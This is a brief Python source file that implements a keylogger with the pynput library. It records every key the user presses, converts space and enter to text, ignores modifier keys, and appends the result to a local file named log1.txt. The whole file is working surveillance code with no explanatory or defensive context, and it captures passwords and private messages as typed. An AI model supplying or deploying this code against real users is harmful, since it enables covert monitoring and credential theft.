from pynput.keyboard import Listener, Key

def writeonpress(key):
    keydata = str(key).replace("'", "")  # Remove single quotes

    # Handle special keys
    if key == Key.space:
        keydata = ' '  # Add a space for the space key
    elif key == Key.enter:
        keydata = '\n'  # Add a newline for the enter key
    elif key in [Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.alt, Key.alt_l, Key.alt_r]:
        keydata = ''  # Ignore these keys
    elif keydata.startswith("Key."):
        keydata = ''  # Ignore all other special keys

    # Write to log file
    with open("log1.txt", 'a') as f:
        f.write(keydata)

# Set up the listener
with Listener(on_press=writeonpress) as l:
    l.join()
